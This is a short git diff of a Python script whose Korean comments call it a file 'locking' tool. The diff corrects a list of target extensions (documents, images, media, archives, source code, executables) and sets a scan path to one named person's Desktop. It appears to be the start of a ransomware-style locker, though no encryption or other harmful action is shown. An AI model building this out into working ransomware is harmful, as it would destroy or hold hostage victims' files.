@@ -1,7 +1,7 @@
 import os
 
 #arr는 잠그기 위한 확장자 list
-arr = ['.doc', '.docx', '.hwp', '.pptx', '.ppt', '.xls', '.pdf', '.ai', '.psd', '.tx', '.bmp', '.gif', '.png', '.jpg', '.jpeg', '.raw', '.tiff', '.was', '.wma', '.mp3', '.mp4', '.mkv', '.avi', '.flv', '.mov', '.7z', '.aip', '.alz', '.egg', '.zip', '.py', '.c', '.cpp', '.java', '.class', '.html', '.ini', '.lnk', '.exe', '.ttf', '.sys', '.dat', 'jar', '.md']
+arr = ['.doc', '.docx', '.hwp', '.pptx', '.ppt', '.xls', '.pdf', '.ai', '.psd', '.txt', '.bmp', '.gif', '.png', '.jpg', '.jpeg', '.raw', '.tiff', '.was', '.wma', '.mp3', '.mp4', '.mkv', '.avi', '.flv', '.mov', '.7z', '.aip', '.alz', '.egg', '.zip', '.py', '.c', '.cpp', '.java', '.class', '.html', '.ini', '.lnk', '.exe', '.ttf', '.sys', '.dat', '.jar', '.md']
 forChange = [] #확장자들의 요소들만을 가지고 있음.
 linkForChange = [] #확장자들이 존재하는 링크list
 link = 'C:\\Users\\Ebaman\\Desktop' #박승민 컴퓨터 기준 배경화면 경로
